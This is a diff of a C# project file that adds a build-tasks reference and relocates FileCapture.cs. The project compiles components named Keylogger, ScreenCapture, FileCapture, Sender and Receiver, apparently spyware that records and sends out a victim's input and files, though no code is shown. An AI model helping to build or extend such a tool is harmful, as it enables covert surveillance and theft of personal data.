@@ -33,6 +33,7 @@
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="Microsoft.Build.Tasks.v4.0" />
     <Reference Include="System" />
     <Reference Include="System.Core" />
     <Reference Include="System.Drawing" />
@@ -44,8 +45,8 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="FileCapture.cs" />
     <Compile Include="Keylogger.cs" />
-    <Compile Include="Properties\FileCapture.cs" />
     <Compile Include="Receiver.cs" />
     <Compile Include="ScreenCapture.cs" />
     <Compile Include="Sender.cs" />
